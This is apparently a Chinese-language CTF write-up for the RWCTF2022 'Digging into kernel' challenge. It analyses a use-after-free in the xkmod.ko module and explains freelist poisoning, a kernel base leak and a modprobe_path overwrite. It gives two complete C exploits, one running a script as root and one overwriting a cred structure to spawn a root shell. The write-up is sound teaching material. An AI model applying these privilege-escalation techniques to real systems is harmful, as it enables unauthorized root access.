---
layout: post
title:  Digging into kernel(RWCTF2022)
date:   2025-01-11 00:08:01 +0300
image:  2025-01-11-sea.jpg
tags:   [ctf,Pwn,kernel,UAF]
---

题目给出了一个 `xkmod.ko` 文件

解cpio发现并没有init

```assembly
grep -lr "xkmod.ko" .
./etc/init.d/rcS
```

查看rcS

```assembly
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict

insmod /xkmod.ko
chmod 644 /dev/xkmod

echo flag{xxxxxxxxx} > /flag
chmod 600 /flag

echo "-------------------------------------------"
echo "|                                         |"
echo "| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"
echo "|                                         |"
echo "-------------------------------------------"


poweroff -d 120 -f &
setsid cttyhack setuidgid 1000 sh

poweroff -f

```

注释自动关机

xkmod_ioctl

```assembly
__int64 __fastcall xkmod_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v4; // [rsp+0h] [rbp-20h] BYREF
  unsigned int v5; // [rsp+8h] [rbp-18h]
  unsigned int v6; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v7; // [rsp+10h] [rbp-10h]

  v7 = __readgsqword(0x28u);
  if ( !a3 )
    return 0LL;
  copy_from_user(&v4, a3, 0x10LL);
  if ( a2 == 0x6666666 )
  {
    if ( buf && v6 <= 0x50 && v5 <= 0x70 )
    {
      copy_from_user((char *)buf + (int)v5, v4, (int)v6);
      return 0LL;
    }
  }
  else
  {
    if ( a2 != 0x7777777 )
    {
      if ( a2 == 0x1111111 )
        buf = (void *)kmem_cache_alloc(s, 0xCC0LL);
      return 0LL;
    }
    if ( buf && v6 <= 0x50 && v5 <= 0x70 )
    {
      copy_to_user(v4, (char *)buf + (int)v5);
      return 0LL;
    }
  }
  return xkmod_ioctl_cold();
}
```

我们应当传入如下结构体：

```assembly
struct Data{
    size_t *ptr;
    unsigned int offset;
    unsigned int length;
}data;
```

漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL，**只要我们同时打开多个设备文件便能完成 UAF**。

xkmod_init

```assembly
int __cdecl xkmod_init()
{
  kmem_cache *v0; // rax

  printk(&unk_1E4);
  misc_register(&xkmod_device);
  v0 = (kmem_cache *)kmem_cache_create("lalala", 0xC0LL, 0LL, 0LL, 0LL);
  buf = 0LL;
  s = v0;
  return 0;
}
```

在模块载入时会新建一个 kmem_cache 叫 `"lalala"`，对应 object 大小是 192，这里我们注意到后面三个参数都是 0 ，对应的是 align（对齐）、flags（标志位）、ctor（构造函数），由于没有设置 `SLAB_ACCOUNT` 标志位故该 `kmem_cache` **会默认与 kmalloc-192 合并**。

xkmod_release

```assembly
int __fastcall xkmod_release(inode *inode, file *file)
{
  return kmem_cache_free(s, buf);
}
```

漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL，**只要我们同时打开多个设备文件便能完成 UAF**。

### 泄露内核基地址

在内核 “堆基址”（`page_offset_base`） + `0x9d000` 处存放着 `secondary_startup_64` 函数的地址，而我们可以从 free object 的 next 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 `堆基址 + 0x9d000` 处的 object 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配。

若是没有猜中，直接重试即可，但这里需要注意的是我们不能够直接退出，而应当保留原进程的文件描述符打开，否则会在退出进程时触发 slub 的 double free 检测，不过经测验大部分情况下都能够猜中堆基址。

### 内核任意地址读写

我们先看看能够利用 UAF 获取到什么信息，经笔者多次尝试可以发现当我们将 buf 释放掉之后读取其中数据时其前 8 字节都是一个**位于内核堆上的指针**，但通常有着不同的页内偏移，这说明：

- 该 kmem_cache 的 offset 为 0
- 该 kernel 未开启 HARDENED_FREELIST 保护
- 该 kernel 开启了 RANDOM_FREELIST 保护

freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，**但是在后面的分配释放中依然遵循着后进先出的原则**，因此我们可以先获得一个 object 的 UAF，修改其 next 为我们想要分配的地址，之后我们连续进行两次分配**便能够成功获得目标地址上的 object ，实现任意地址读写**。

但这么做有着一个小问题，当我们分配到目标地址时**目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址**，从而导致 kernel panic，因此我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 NULL 指针，促使 kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash。

### 修改 modprobe_path 以 root 执行程序

接下来我们考虑如何通过任意地址写完成利用，比较常规的做法是覆写内核中的一些全局的可写的函数表（例如 `n_tty_ops`）来劫持内核执行流，这里选择覆写 `modprobe_path` 从而以 root 执行程序。

当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：

```assembly
entry_SYSCALL_64()
    sys_execve()
        do_execve()
            do_execveat_common()
                bprm_execve()
                    exec_binprm()
                        search_binary_handler()
                            __request_module() // wrapped as request_module
                                call_modprobe()
```

其中 `call_modprobe()` 定义于 `kernel/kmod.c`，我们主要关注这部分代码（以下来着内核源码 5.14）：

```assembly
static int call_modprobe(char *module_name, int wait)
{
    //...
    argv[0] = modprobe_path;
    argv[1] = "-q";
    argv[2] = "--";
    argv[3] = module_name;  /* check free_modprobe_argv() */
    argv[4] = NULL;

    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                     NULL, free_modprobe_argv, NULL);
    if (!info)
        goto free_module_name;

    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
    //...
```

在这里调用了函数 `call_usermodehelper_exec()` 将 `modprobe_path` 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为`/sbin/modprobe`。

我们不难想到的是：若是我们能够劫持 modprobe_path，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，**内核将会以 root 权限执行我们的恶意脚本**。

EXP

```assembly
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>


/* bind the process to specific core */
void bindCore(int core){
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

long dev_fd;

typedef struct data{
    size_t *ptr;
    unsigned int offset;
    unsigned int length;
}Data;


void allocBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x1111111, data);
}


void editBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x6666666, data);
}


void readBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x7777777, data);
}


#define ROOT_SCRIPT_PATH  "/home/getshell"
#define MODPROBE_PATH 0xffffffff82444700


int main(void){
    bindCore(0);

    int dev_fd[5];
    for (int i = 0; i < 5; i++) {
        dev_fd[i] = open("/dev/xkmod", O_RDONLY);
    }


    Data data;
    data.ptr = malloc(0x1000);
    data.offset = 0;
    data.length = 0x50;
    memset(data.ptr, 0, 0x1000);


    allocBuf(dev_fd[0], &data);
    editBuf(dev_fd[0], &data);
    close(dev_fd[0]);

    readBuf(dev_fd[1], &data);
    printf("%x\n", data.ptr[0]);

    size_t kernel_heap_leak = data.ptr[0];
    size_t page_offset_base = kernel_heap_leak & 0xfffffffff0000000;
    printf("%x\n", page_offset_base);
    

    data.ptr[0] = page_offset_base + 0x9d000 - 0x10;
    data.offset = 0;
    data.length = 8;
    editBuf(dev_fd[1], &data);
    allocBuf(dev_fd[1], &data);
    allocBuf(dev_fd[1], &data);
    

    data.length = 0x40;
    readBuf(dev_fd[1], &data);
    if ((data.ptr[2] & 0xfff) != 0x30) {
        printf("[!] invalid data leak: 0x%lx\n", data.ptr[2]);
    }
    size_t kernel_base = data.ptr[2] - 0x30;
    size_t kernel_offset = kernel_base - 0xffffffff81000000;


    char root_cmd[] = "#!/bin/sh\nchmod 777 /flag";
    size_t root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);
    write(root_script_fd, root_cmd, sizeof(root_cmd));
    close(root_script_fd);
    system("chmod +x " ROOT_SCRIPT_PATH);

    allocBuf(dev_fd[1], &data);
    close(dev_fd[1]);

    data.ptr[0] = kernel_offset + MODPROBE_PATH - 0x10;
    data.offset = 0;
    data.length = 0x8;

    editBuf(dev_fd[2], &data);
    allocBuf(dev_fd[2], &data);
    allocBuf(dev_fd[2], &data);

    strcpy((char *) &data.ptr[2], ROOT_SCRIPT_PATH);
    data.length = 0x30;
    editBuf(dev_fd[2], &data);

    /* trigger the fake modprobe_path */
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
    system("chmod +x /home/fake");
    system("/home/fake");

    
    char flag[0x100];
    memset(flag, 0, sizeof(flag));

    size_t flag_fd = open("/flag", O_RDWR);

    read(flag_fd, flag, sizeof(flag));
    printf("%s\n", flag);

    return 0;
}
```

### 利用 UAF 修改子进程的 cred 完成提权

**直接修改子进程的 cred 完成提权**，**通过 UAF 修改该进程的 cred 结构体的 uid、gid 为 0**

但是**此种方法在较新版本 kernel 中已不可行，我们已无法直接分配到 cred_jar 中的 object**，这是因为 cred_jar 在创建时设置了 `SLAB_ACCOUNT` 标记，在 `CONFIG_MEMCG_KMEM=y` 时（默认开启）**cred_jar 不会再与相同大小的 kmalloc-192 进行合并**

```assembly
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sched.h>


typedef struct data{
    size_t *ptr;
    unsigned int offset;
    unsigned int length;
}Data;


void allocBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x1111111, data);
}


void editBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x6666666, data);
}


void readBuf(int dev_fd, Data *data){
    ioctl(dev_fd, 0x7777777, data);
}


int main(void){
    int dev_fd[5];
    for (int i = 0; i < 5; i++) {
        dev_fd[i] = open("/dev/xkmod", O_RDONLY);
    }


    Data data;
    data.ptr = malloc(0x100);
    data.offset = 0;
    data.length = 0x50;

    allocBuf(dev_fd[0], &data);
    close(dev_fd[0]);


    int pid = fork();
    if (!pid){
        for (int i = 0; i < 10; i++){
            data.ptr[i] = 0;
        }
        editBuf(dev_fd[1], &data);
        if (!getuid()){
            puts("[+] Get root.");
            setresuid(0, 0, 0);
            setresgid(0, 0, 0);
            system("/bin/sh");
            exit(EXIT_SUCCESS);
        }

    }
    wait(NULL);

    return 0;
}
```

参考：

https://xz.aliyun.com/t/11053?time__1311=Cq0x2Qi%3DGQDQitD%2F8re7KG%3DBm2bF7%3DWK4D#toc-4

https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/freelist/#rwctf2022-digging-into-kernel-1-2

https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/slub/uaf/#old-solution